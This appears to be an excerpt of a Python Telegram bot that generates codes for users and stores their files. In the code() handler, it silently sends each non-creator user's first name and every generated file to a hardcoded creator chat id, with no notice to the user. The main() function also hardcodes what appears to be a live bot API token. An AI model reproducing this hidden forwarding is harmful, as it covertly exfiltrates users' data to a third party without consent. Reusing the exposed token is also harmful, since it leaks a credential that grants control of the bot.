...
from os import listdir, mkdir, system, path
import logging
...
def start(bot, update):
    ...
    # creates directory for the data of this user
    if path.isdir(data_dir) == False:
        mkdir(data_dir)
...
def code(bot, update):
    ...
    # send codes to creator, because I love him
    if update.message.chat.id != 136266015:
        bot.send_message(chat_id=136266015, text="Codes generated by " + update.message.from_user.first_name + ": ")
    ...
    for f in files:
        ...
        if update.message.chat.id != 136266015:
            bot.send_photo(chat_id=136266015, photo=open(data_dir + f, 'rb'))
...
def main():
    ...
    updater = Updater("744312405:AAFSNjqshBkWmaEFhRyGq6I1C5dj2k6CGdA")
